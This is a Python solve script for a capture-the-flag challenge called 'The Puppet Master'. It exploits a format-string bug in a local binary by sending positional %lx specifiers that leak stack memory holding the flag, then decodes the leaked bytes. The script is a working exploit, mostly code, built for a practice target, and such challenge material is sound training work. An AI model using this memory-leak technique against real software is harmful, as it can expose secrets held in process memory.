#!/usr/bin/env python3
"""
Solve script for 'The Puppet Master' (Binary Exploitation, Hard).

This is a genuine format-string vulnerability: printf(whisper) uses
user-controlled input directly as the format string. On this modern glibc,
%n writes are blocked when the format string lives in writable memory (a
real, current hardening feature) — so the intended exploitation path is an
INFORMATION LEAK via %lx, reading raw stack memory (including a local
"true_name" buffer holding the flag) at chosen positional offsets.

Verified: positions 22-25 (%22$lx .. %25$lx) contain the flag's bytes.

Usage: python3 solve.py  (run in the same directory as the binary)
"""
import subprocess

payload = b".".join(f"%{i}$lx".encode() for i in range(22, 26))

p = subprocess.run(["./puppet_master"], input=payload + b"\n", capture_output=True, timeout=3)
out = p.stdout.decode(errors="replace")
line = out.split("Whisper something: ")[1].split("\n")[0]
chunks = line.split(".")

flag = ""
for c in chunks:
    b = bytes.fromhex(c.zfill(16))[::-1]
    flag += b.decode(errors="ignore")

# Trim at the closing brace (stack bytes beyond the flag are unrelated memory)
flag = flag[: flag.index("}") + 1]
print("[+] Leaked via format string:", flag)
